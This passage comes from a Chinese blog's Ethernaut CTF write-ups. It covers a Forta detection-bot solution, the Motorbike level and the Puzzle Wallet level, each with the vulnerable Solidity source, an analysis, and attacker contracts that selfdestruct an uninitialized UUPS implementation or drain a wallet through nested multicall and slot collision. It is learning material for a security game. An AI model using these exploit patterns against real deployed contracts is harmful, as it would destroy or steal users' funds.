2.我们来尝试一下是否可以攻击成功</span><br><span class="line">        vault.sweepToken(address(LGT));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 3. 用玩家EOA账号部署一个MyRobot</span><br><span class="line">contract MyRobot is IDetectionBot &#123;</span><br><span class="line">    ICryptoVault vault;</span><br><span class="line"></span><br><span class="line">    constructor(ICryptoVault _addr) public &#123;</span><br><span class="line">        vault = _addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function handleTransaction(address user, bytes calldata msgData) external override &#123;</span><br><span class="line"></span><br><span class="line">        address origSender;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            origSender := calldataload(0xa8)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(origSender == address(vault)) &#123;</span><br><span class="line">            IForta(msg.sender).raiseAlert(user);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// 4. 创建一个新的题目instance</span><br><span class="line">// 5. 用EOA账户调用新实例的IForta的setDetectionBot()设置报警机器人</span><br><span class="line">// 6. 完成</span><br></pre></td></tr></table></figure><p>给出攻击的流程：</p><p><img src="https://moe.photo/images/2023/07/19/image-20230719202515103.png" alt></p><p>成功</p><p><img src="https://moe.photo/images/2023/07/19/image-20230719181008465.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 04.Ethernaut CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>25.Motobike</title>
      <link href="/2023/07/19/04.Ethernaut%20CTF/25.Motobike/"/>
      <url>/2023/07/19/04.Ethernaut%20CTF/25.Motobike/</url>
      
        <content type="html"><![CDATA[<h1 id="Motobike"><a href="#Motobike" class="headerlink" title="Motobike"></a>Motobike</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>要求：将Engine合约摧毁(selfdestruct)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity &lt;0.7.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-06/utils/Address.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts-06/proxy/Initializable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Motorbike &#123;</span><br><span class="line">    // keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1</span><br><span class="line">    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;</span><br><span class="line">    </span><br><span class="line">    struct AddressSlot &#123;</span><br><span class="line">        address value;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.</span><br><span class="line">    constructor(address _logic) public &#123;</span><br><span class="line">        require(Address.isContract(_logic), &quot;ERC1967: new implementation is not a contract&quot;);</span><br><span class="line">        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;</span><br><span class="line">        (bool success,) = _logic.delegatecall(</span><br><span class="line">            abi.encodeWithSignature(&quot;initialize()&quot;)</span><br><span class="line">        );</span><br><span class="line">        require(success, &quot;Call failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Delegates the current call to `implementation`.</span><br><span class="line">    function _delegate(address implementation) internal virtual &#123;</span><br><span class="line">        // solhint-disable-next-line no-inline-assembly</span><br><span class="line">        assembly &#123;</span><br><span class="line">            calldatacopy(0, 0, calldatasize())</span><br><span class="line">            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)</span><br><span class="line">            returndatacopy(0, 0, returndatasize())</span><br><span class="line">            switch result</span><br><span class="line">            case 0 &#123; revert(0, returndatasize()) &#125;</span><br><span class="line">            default &#123; return(0, returndatasize()) &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Fallback function that delegates calls to the address returned by `_implementation()`. </span><br><span class="line">    // Will run if no other function in the contract matches the call data</span><br><span class="line">    fallback () external payable virtual &#123;</span><br><span class="line">        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Returns an `AddressSlot` with member `value` located at `slot`.</span><br><span class="line">    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) &#123;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            r_slot := slot</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Engine is Initializable &#123;</span><br><span class="line">    // keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1</span><br><span class="line">    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;</span><br><span class="line"></span><br><span class="line">    address public upgrader;</span><br><span class="line">    uint256 public horsePower;</span><br><span class="line"></span><br><span class="line">    struct AddressSlot &#123;</span><br><span class="line">        address value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function initialize() external initializer &#123;</span><br><span class="line">        horsePower = 1000;</span><br><span class="line">        upgrader = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Upgrade the implementation of the proxy to `newImplementation`</span><br><span class="line">    // subsequently execute the function call</span><br><span class="line">    function upgradeToAndCall(address newImplementation, bytes memory data) external payable &#123;</span><br><span class="line">        _authorizeUpgrade();</span><br><span class="line">        _upgradeToAndCall(newImplementation, data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Restrict to upgrader role</span><br><span class="line">    function _authorizeUpgrade() internal view &#123;</span><br><span class="line">        require(msg.sender == upgrader, &quot;Can&#x27;t upgrade&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.</span><br><span class="line">    function _upgradeToAndCall(</span><br><span class="line">        address newImplementation,</span><br><span class="line">        bytes memory data</span><br><span class="line">    ) internal &#123;</span><br><span class="line">        // Initial upgrade and setup call</span><br><span class="line">        _setImplementation(newImplementation);</span><br><span class="line">        if (data.length &gt; 0) &#123;</span><br><span class="line">            (bool success,) = newImplementation.delegatecall(data);</span><br><span class="line">            require(success, &quot;Call failed&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // Stores a new address in the EIP1967 implementation slot.</span><br><span class="line">    function _setImplementation(address newImplementation) private &#123;</span><br><span class="line">        require(Address.isContract(newImplementation), &quot;ERC1967: new implementation is not a contract&quot;);</span><br><span class="line">        </span><br><span class="line">        AddressSlot storage r;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            r_slot := _IMPLEMENTATION_SLOT</span><br><span class="line">        &#125;</span><br><span class="line">        r.value = newImplementation;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ul><li>UUPS代理</li><li>Motorbike在构造器中是delegatecall实现类Engine的<code>initialize()</code>，因此是初始化本合约中的内容，而没有初始化Engine，因此Engine的<code>initialize()</code>尚未被调用过。任何人都可以调用<code>initialize()</code>来设置upgrader</li><li>UUPS的实现类地址不是存放在proxy中，而是存放在实现类中。我们调用<code>upgradeToAndCall()</code>修改实现类地址的时候，还会调用实现类的任意一个方法。</li><li>正常逻辑实现类地址应该是Engine的地址，或者由MotorBike来修改实现类地址。但是这里可以成为upgrader，可以将实现类地址修改成恶意地址</li><li>题目给的是instance地址，也就是motorbike合约的地址，实现类合约Engine的地址需要我们去slot 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc 获得。</li></ul><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>code</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.6.7;</span><br><span class="line"></span><br><span class="line">interface IEngine&#123;</span><br><span class="line">    function initialize() external;</span><br><span class="line">    function upgradeToAndCall(address,bytes calldata) external payable ;</span><br><span class="line">    function upgrader() external view returns(address);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract attacker&#123;</span><br><span class="line">    // level instance&#x27;s address: 0x4Eb81234e2A2b8Ec4C6bc1d4723aB609de5E0e39 proxy</span><br><span class="line">    // Engine&#x27;s address: getStorageAt(0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc)</span><br><span class="line">    //                   the result is 0x000000000000000000000000c09abaff6aeba3978121a923aa3a7d99f926b34f</span><br><span class="line">    // so target = 0xc09abaff6aeba3978121a923aa3a7d99f926b34f</span><br><span class="line">    function attack(IEngine target) external&#123;</span><br><span class="line">        target.initialize();</span><br><span class="line">        target.upgradeToAndCall(</span><br><span class="line">            address(this),</span><br><span class="line">            abi.encodeWithSelector(this.kill.selector)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function kill() external&#123;</span><br><span class="line">        selfdestruct(payable(address(0)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>attack flow</p><p><img src="https://moe.photo/images/2023/07/19/image-20230719144626118.png" alt></p><p>successfully</p><p><img src="https://moe.photo/images/2023/07/19/image-20230719143258214.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 04.Ethernaut CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>24.Puzzle Wallet</title>
      <link href="/2023/07/17/04.Ethernaut%20CTF/24.Puzzle%20Wallet/"/>
      <url>/2023/07/17/04.Ethernaut%20CTF/24.Puzzle%20Wallet/</url>
      
        <content type="html"><![CDATA[<h1 id="Puzzle-Wallet"><a href="#Puzzle-Wallet" class="headerlink" title="Puzzle Wallet"></a>Puzzle Wallet</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>要求：成为admin</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">pragma experimental ABIEncoderV2;</span><br><span class="line"></span><br><span class="line">import &quot;../helpers/UpgradeableProxy-08.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract PuzzleProxy is UpgradeableProxy &#123;</span><br><span class="line">    address public pendingAdmin;</span><br><span class="line">    address public admin;</span><br><span class="line"></span><br><span class="line">    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) &#123;</span><br><span class="line">        admin = _admin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyAdmin &#123;</span><br><span class="line">      require(msg.sender == admin, &quot;Caller is not the admin&quot;);</span><br><span class="line">      _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function proposeNewAdmin(address _newAdmin) external &#123;</span><br><span class="line">        pendingAdmin = _newAdmin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approveNewAdmin(address _expectedAdmin) external onlyAdmin &#123;</span><br><span class="line">        require(pendingAdmin == _expectedAdmin, &quot;Expected new admin by the current admin is not the pending admin&quot;);</span><br><span class="line">        admin = pendingAdmin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function upgradeTo(address _newImplementation) external onlyAdmin &#123;</span><br><span class="line">        _upgradeTo(_newImplementation);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract PuzzleWallet &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint256 public maxBalance;</span><br><span class="line">    mapping(address =&gt; bool) public whitelisted;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    function init(uint256 _maxBalance) public &#123;</span><br><span class="line">        require(maxBalance == 0, &quot;Already initialized&quot;);</span><br><span class="line">        maxBalance = _maxBalance;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyWhitelisted &#123;</span><br><span class="line">        require(whitelisted[msg.sender], &quot;Not whitelisted&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted &#123;</span><br><span class="line">      require(address(this).balance == 0, &quot;Contract balance is not 0&quot;);</span><br><span class="line">      maxBalance = _maxBalance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function addToWhitelist(address addr) external &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;Not the owner&quot;);</span><br><span class="line">        whitelisted[addr] = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit() external payable onlyWhitelisted &#123;</span><br><span class="line">      require(address(this).balance &lt;= maxBalance, &quot;Max balance reached&quot;);</span><br><span class="line">      balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted &#123;</span><br><span class="line">        require(balances[msg.sender] &gt;= value, &quot;Insufficient balance&quot;);</span><br><span class="line">        balances[msg.sender] -= value;</span><br><span class="line">        (bool success, ) = to.call&#123; value: value &#125;(data);</span><br><span class="line">        require(success, &quot;Execution failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function multicall(bytes[] calldata data) external payable onlyWhitelisted &#123;</span><br><span class="line">        bool depositCalled = false;</span><br><span class="line">        for (uint256 i = 0; i &lt; data.length; i++) &#123;</span><br><span class="line">            bytes memory _data = data[i];</span><br><span class="line">            bytes4 selector;</span><br><span class="line">            assembly &#123;</span><br><span class="line">                selector := mload(add(_data, 32))</span><br><span class="line">            &#125;</span><br><span class="line">            if (selector == this.deposit.selector) &#123;</span><br><span class="line">                require(!depositCalled, &quot;Deposit can only be called once&quot;);</span><br><span class="line">                // Protect against reusing msg.value</span><br><span class="line">                depositCalled = true;</span><br><span class="line">            &#125;</span><br><span class="line">            (bool success, ) = address(this).delegatecall(data[i]);</span><br><span class="line">            require(success, &quot;Error while delegating call&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这道题是有关于代理的，先来看看合约分别干啥：</p><ul><li>PuzzleProxy<ul><li>代理合约，题目给我们的instance也是这个</li><li>我们和这个合约交互，可以调用它本合约中有的方法，如果没有的方法会走到继承的父类的fallback，里面有delegatecall方法来去到实现类进行调用，也就是PuzzleWallet合约</li></ul></li><li>PuzzleWallet<ul><li>slot冲突</li><li>multicall()方法存在漏洞</li></ul></li></ul><h3 id="1-成为owner"><a href="#1-成为owner" class="headerlink" title="1.成为owner"></a>1.成为owner</h3><p>任何人都可以调用下面的方法设置pendingAdmin的值，也就是slot 0 的值，在PuzzleWallet合约中也就是修改了owner的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function proposeNewAdmin(address _newAdmin) external &#123;</span><br><span class="line">    pendingAdmin = _newAdmin;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-成为admin"><a href="#2-成为admin" class="headerlink" title="2.成为admin"></a>2.成为admin</h3><p>要修改admin的值，也就是修改maxBalance的值。而能修改maxBalance的地方只有<code>setMaxBalance()</code>。有个onlyWhitelisted限制，因为我们已经是owner了，所以我们可以用<code>addToWhitelist()</code>将自己加入白名单。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted &#123;</span><br><span class="line">  require(address(this).balance == 0, &quot;Contract balance is not 0&quot;);</span><br><span class="line">  maxBalance = _maxBalance;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只要我们将参数<code>_maxBalance</code>设置为我们的地址，然后调用成功就能修改admin了。但是有个条件，需要我们将Proxy合约的余额设置为0。</p><p>取钱的地方只有<code>execute()</code>。但是按照正常逻辑<code>deposit()</code>然后<code>execute()</code>取钱是无法将合约余额置为0的，因为我们只能取出属于我们的那一部分，存多少拿多少。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted &#123;</span><br><span class="line">    require(balances[msg.sender] &gt;= value, &quot;Insufficient balance&quot;);</span><br><span class="line">    balances[msg.sender] -= value;</span><br><span class="line">    (bool success, ) = to.call&#123; value: value &#125;(data);</span><br><span class="line">    require(success, &quot;Execution failed&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Proxy合约为了用户可以将多个操作一次性执行完毕来节省gas，它在实现类里面写了一个批处理方法。要求我们传入一个bytes数组，里面要存放函数选择器，然后会解码出选择器并跟proxy和实现类合约进行比较，找到匹配的方法然后执行。接下来详细分析这个方法：</p><ul><li>参数depositCalled：用于防止for loop + msg.value用一份钱来存多次记录金额。</li><li>for循环：data是动态数组，有多少个函数选择器就执行几次</li><li><code>selector := mload(add(_data, 32))</code>：根据abi编码中动态数组的规则，跳过offset，取32字节的实际数据。因为selector是4字节，取高4字节的数据，因为bytes是高位开始编码的，因此这里就取到了我们设置的函数选择器。</li><li><code>if (selector == this.deposit.selector)</code>：之前调用过<code>deposit()</code>就不可以再次调用，用于防止for loop + msg.value用一份钱来存多次记录金额。</li><li><code>address(this).delegatecall(data[i]);</code>：delegatecall+代理调用匹配到的方法</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function multicall(bytes[] calldata data) external payable onlyWhitelisted &#123;</span><br><span class="line">    bool depositCalled = false;</span><br><span class="line">    for (uint256 i = 0; i &lt; data.length; i++) &#123;</span><br><span class="line">        bytes memory _data = data[i];</span><br><span class="line">        bytes4 selector;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            selector := mload(add(_data, 32))</span><br><span class="line">        &#125;</span><br><span class="line">        if (selector == this.deposit.selector) &#123;</span><br><span class="line">            require(!depositCalled, &quot;Deposit can only be called once&quot;);</span><br><span class="line">            // Protect against reusing msg.value</span><br><span class="line">            depositCalled = true;</span><br><span class="line">        &#125;</span><br><span class="line">        (bool success, ) = address(this).delegatecall(data[i]);</span><br><span class="line">        require(success, &quot;Error while delegating call&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编写合约的人已经意识到msg.value在循环中可能会被利用进行多次deposit，但是他考虑还是欠佳，这里还是存在漏洞的：bytes数组允许执行多个方法，那么我们可以这么操作：</p><ul><li>bytes[0]：调用<code>deposit()</code>，这时就记录下来<code>deposit()</code>已经调用过，因此后续不可以再在这个上下文执行deposit()，注意是这个上下文</li><li>bytes[1]：调用<code>multicall()</code>，也就是说我们在调用<code>multicall()</code>的时候，再次调用<code>multicall()</code>。这就是神奇的地方了：当<code>address(this).delegatecall(data[i]);</code>：执行到这里的时候，会打开一下新的上下文，此时那个上下文还没调用过<code>deposit()</code>。</li></ul><p>为此我们构造bytes数组的内容：</p><ul><li>bytes[0]：其实这里无论是encode，encodePacked还是怎么样都可以，因为是只取高4字节数据，并且是动态变长数组</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abi.encodeWithSelector(level.deposit.selector);</span><br></pre></td></tr></table></figure><ul><li>bytes[1]：为什么data[1]第二个参数要写成deposit_data，而不一样写成<code>level.deposit.selector</code>的形式呢？因为在<code>level.multicall.selector</code>在解析为函数选择器来进行匹配进行再次<code>multicall()</code>执行的时候，第二个参数的内容就会作为<code>multicall()</code>的形参，因此也符合abi编码规范。而这个规范不是说直接abi.encodeWithSelector就可以的，要包装成一个bytes[]才行。因此需要传入一个bytes[]，也就是deposit_data。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bytes[] memory deposit_data = new bytes[](1);</span><br><span class="line">deposit_data[0] = abi.encodeWithSelector(level.deposit.selector);</span><br><span class="line"></span><br><span class="line">bytes[] memory data = new bytes[](2);</span><br><span class="line">// 设置bytes[0]</span><br><span class="line">data[0] = deposit_data[0]; </span><br><span class="line">// 设置bytes[1]</span><br><span class="line">data[1] = abi.encodeWithSelector(level.multicall.selector,deposit_data);</span><br></pre></td></tr></table></figure><p>假设我们deposit金额为0.001ether。构造好之后，攻击的逻辑是：第一次调用<code>deposit()</code>时记录了balances[msg.sender]增加了0.001ether。第二次调用deposit的时候，一份msg.value重复使用，balances[msg.sender]又增加了0.001ether。此时结果为：合约中拥有题目部署时候的0.001ether+我们存入的0.001ether，即0.002ether。</p><p>此时我们就可以调用execute()取出0.002ether，使得合约余额为0，可以调用setMaxBalance设置maxBalance的值，也就是可以设置slot 1所在变量admin的值，设置为我们的EOA地址即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted &#123;</span><br><span class="line">  require(address(this).balance == 0, &quot;Contract balance is not 0&quot;);</span><br><span class="line">  maxBalance = _maxBalance;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted &#123;</span><br><span class="line">    require(balances[msg.sender] &gt;= value, &quot;Insufficient balance&quot;);</span><br><span class="line">    balances[msg.sender] -= value;</span><br><span class="line">    (bool success, ) = to.call&#123; value: value &#125;(data);</span><br><span class="line">    require(success, &quot;Execution failed&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface IPuzzleProxy  &#123;</span><br><span class="line">    function admin() external view returns(address);</span><br><span class="line">    function proposeNewAdmin(address) external;</span><br><span class="line">    function addToWhitelist(address) external;</span><br><span class="line">    function deposit() external payable ;</span><br><span class="line">    function multicall(bytes[] calldata) external payable ;</span><br><span class="line">    function execute(address,uint256,bytes calldata) external payable ;</span><br><span class="line">    function setMaxBalance(uint256) external; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract attacker&#123;</span><br><span class="line">// msg.value = 1000000000000000 wei = 0.001 ether</span><br><span class="line">    constructor(IPuzzleProxy level) payable &#123;</span><br><span class="line">        level.proposeNewAdmin(address(this));</span><br><span class="line">        level.addToWhitelist(address(this));</span><br><span class="line"></span><br><span class="line">        bytes[] memory deposit_data = new bytes[](1);</span><br><span class="line">        deposit_data[0] = abi.encodeWithSelector(level.deposit.selector);</span><br><span class="line"></span><br><span class="line">        bytes[] memory data = new 